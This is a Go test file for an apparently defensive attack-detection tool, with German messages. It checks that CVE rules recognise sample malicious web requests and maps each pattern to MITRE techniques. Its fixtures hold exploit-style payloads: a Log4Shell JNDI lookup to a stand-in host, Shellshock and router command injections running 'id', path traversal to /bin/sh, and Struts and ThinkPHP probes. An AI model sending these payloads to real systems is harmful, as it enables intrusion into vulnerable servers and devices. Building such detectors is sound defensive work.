package main

import (
	"testing"
	"time"
)

var cveExamples = map[string]string{
	"CVE-2017-9841":  "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
	"CVE-2018-20062": `/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array`,
	"CVE-2021-44228": "/?x=${jndi:ldap://x.example/a}",
	"CVE-2018-10561": "/GponForm/diag_Form?images/",
	"CVE-2017-17215": "/ctrlt/DeviceUpgrade_1",
	"CVE-2014-8361":  "/picsdesc.xml",
	"CVE-2017-5638":  "/\n\nContent-Type: %{(#_='multipart/form-data')}",
	"CVE-2022-22947": "/actuator/gateway/routes/hacktest",
	"CVE-2021-41773": "/cgi-bin/.%2e/.%2e/.%2e/bin/sh",
	"CVE-2022-1388":  "/mgmt/tm/util/bash",
	"CVE-2023-1389":  "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id)",
	"CVE-2020-25506": "/cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item",
	"CVE-2014-6271":  "/\n\nUser-Agent: () { :; }; /bin/bash -c id",
	"CVE-2015-2051":  "/HNAP1/\n\nSOAPAction: http://purenetworks.com/HNAP1/GetDeviceSettings/`id`",
	"CVE-2021-26084": "/pages/createpage-entervariables.action?SpaceKey=x",
	"CVE-2019-9082":  `/index.php?s=index/\think\app/invokefunction`,
}

func TestCVERules(t *testing.T) {
	for _, r := range cveRules {
		ex, ok := cveExamples[r.CVE]
		if !ok {
			t.Errorf("%s ohne Beispiel", r.CVE)
			continue
		}
		found := false
		for _, m := range eventCVEs(ex, "web") {
			found = found || m.CVE == r.CVE
		}
		if !found {
			t.Errorf("%s passt nicht auf %q", r.CVE, ex)
		}
	}
	for _, harmless := range []string{"/index.html", "/wp-login.php", "/.env", "/robots.txt"} {
		if m := eventCVEs(harmless, "web"); len(m) != 0 {
			t.Errorf("%q löst %v aus", harmless, m)
		}
	}
	// am Angriff und im Bericht
	e := evAt(time.Time{}, "request", "http", "", 80, map[string]any{"path": cveExamples["CVE-2017-17215"], "method": "POST"})
	a := attackOf(e)
	if len(a.CVEs) != 1 || a.CVEs[0].Key != "CVE-2017-17215" || len(a.Mitre) == 0 {
		t.Fatalf("Angriff: %v %v", a.CVEs, a.Mitre)
	}
	if r := BuildReport("x", []*Event{e}, false); len(r.CVEs) != 1 || r.Severity != "hoch" {
		t.Fatalf("Bericht: %v %s", r.CVEs, r.Severity)
	}
}

func TestEveryPatternHasMitre(t *testing.T) {
	for _, p := range patterns {
		ids := patternMitre[p.ID]
		if len(ids) == 0 {
			t.Errorf("Muster %s ohne MITRE-Zuordnung", p.ID)
		}
		for _, id := range ids {
			if mitreNames[id] == "" {
				t.Errorf("Technik %s ohne Namen", id)
			}
		}
	}
}
